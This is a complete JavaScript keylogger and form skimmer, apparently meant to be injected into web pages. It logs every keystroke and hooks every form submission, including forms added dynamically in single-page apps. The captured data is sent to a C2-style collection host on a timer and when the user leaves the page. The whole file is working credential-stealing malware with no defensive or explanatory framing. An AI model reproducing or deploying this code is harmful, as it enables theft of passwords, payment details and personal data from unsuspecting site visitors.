(function() {
'use strict';

// Configuration
const config = {
// The URL where the collected data will be sent.
// Replace 'YOUR_EXFILTRATION_SERVER_URL' with your actual server endpoint.
exfiltrationUrl: 'c2.v3accntc2.com.internal/collect',
// Interval in milliseconds to send buffered data.
exfiltrationInterval: 10000, // 10 seconds
// Set to true to log captured data to the console for debugging.
debugMode: true
};

// Internal state
let capturedData = {
url: window.location.href,
userAgent: navigator.userAgent,
timestamp: new Date().toISOString(),
keystrokes: [],
forms: []
};
let currentFormBuffer = {};
let activeElement = null;

// --- Core Functions ---

/**
* Sends the collected data to the exfiltration server.
* Uses navigator.sendBeacon for reliability, especially on page unload.
*/
function exfiltrateData() {
if (capturedData.keystrokes.length === 0 && capturedData.forms.length === 0) {
return; // Nothing to send
}

const payload = JSON.stringify(capturedData);
if (config.debugMode) {
console.log('Exfiltrating Data:', payload);
}

// Use sendBeacon for a reliable, non-blocking request.
// Falls back to fetch if sendBeacon is not available.
if (navigator.sendBeacon) {
navigator.sendBeacon(config.exfiltrationUrl, payload);
} else {
fetch(config.exfiltrationUrl, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: payload,
keepalive: true // Ensures the request completes on page unload
}).catch(e => {
if (config.debugMode) console.error('Exfiltration failed:', e);
});
}

// Reset the buffer after sending
capturedData.keystrokes = [];
capturedData.forms = [];
}

/**
* Captures a single keystroke.
*/
function captureKeystroke(event) {
const key = event.key;
const keyCode = event.keyCode;
const target = event.target;
const targetInfo = {
tagName: target.tagName,
id: target.id,
className: target.className,
name: target.name,
type: target.type
};

const keystrokeData = {
key: key,
keyCode: keyCode,
timestamp: new Date().toISOString(),
target: targetInfo
};

capturedData.keystrokes.push(keystrokeData);
if (config.debugMode) {
console.log('Key captured:', keystrokeData);
}
}

/**
* Captures data from a form upon submission.
*/
function captureFormSubmission(event) {
const form = event.target;
const formData = new FormData(form);
const formObj = {};

// Convert FormData to a simple object
for (let [key, value] of formData.entries()) {
// Avoid capturing sensitive file data
if (value instanceof File) {
formObj[key] = '[FILE]';
} else {
formObj[key] = value;
}
}

const submissionData = {
formAction: form.action,
formMethod: form.method,
fields: formObj,
timestamp: new Date().toISOString()
};

capturedData.forms.push(submissionData);
if (config.debugMode) {
console.log('Form submission captured:', submissionData);
}

// Immediately exfiltrate on form submission for high-value data
exfiltrateData();
}

/**
* Scans the document for existing forms and attaches listeners.
*/
function attachToExistingForms() {
document.querySelectorAll('form').forEach(form => {
form.addEventListener('submit', captureFormSubmission, true);
});
}

/**
* Uses a MutationObserver to find new forms added to the DOM dynamically.
* This is crucial for modern SPAs like React, Vue, or Angular apps.
*/
function observeNewForms() {
const observer = new MutationObserver((mutations) => {
mutations.forEach((mutation) => {
mutation.addedNodes.forEach((node) => {
// Check if the added node is a form or contains a form
if (node.nodeType === Node.ELEMENT_NODE) {
if (node.tagName === 'FORM') {
node.addEventListener('submit', captureFormSubmission, true);
} else if (node.querySelectorAll) {
node.querySelectorAll('form').forEach(form => {
form.addEventListener('submit', captureFormSubmission, true);
});
}
}
});
});
});

observer.observe(document.body, {
childList: true,
subtree: true
});
}

// --- Initialization ---
function init() {
if (config.debugMode) {
console.log('Sniffer initialized on:', window.location.href);
}

// Attach global keydown listener
document.addEventListener('keydown', captureKeystroke, true);

// Attach to forms already on the page
attachToExistingForms();

// Start observing for dynamically added forms
observeNewForms();

// Set up periodic exfiltration
setInterval(exfiltrateData, config.exfiltrationInterval);

// Final exfiltration attempt when the user leaves the page
window.addEventListener('beforeunload', exfiltrateData);
}

// Start the sniffer
init();

})();
